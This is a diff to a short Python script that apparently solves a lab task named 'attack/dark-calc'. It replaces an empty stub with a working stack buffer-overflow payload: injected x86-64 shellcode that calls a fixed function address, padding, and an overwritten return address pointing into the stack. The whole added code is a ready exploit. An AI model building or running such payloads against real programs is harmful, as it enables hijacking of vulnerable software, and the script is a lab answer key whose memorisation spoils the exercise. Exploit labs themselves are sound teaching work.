@@ -1,10 +1,14 @@
-#!/usr/bin/env python3
-"""Task 2: build the payload for attack/dark-calc.
-
-TODO: replace the empty payload with the bytes required by the lab.
-"""
 import sys
+from struct import pack
 
-payload = b""
+ADDR = 0x721000800fd0
 
-sys.stdout.buffer.write(payload)
+shellcode  = bytes.fromhex("bf04000000")
+shellcode += bytes.fromhex("b8871a4000")
+shellcode += bytes.fromhex("ffd0")
+
+payload  = shellcode + b"A" * (16 - len(shellcode))
+payload += b"B" * 8
+payload += pack("<Q", ADDR)
+
+sys.stdout.buffer.write(payload + b"\n")
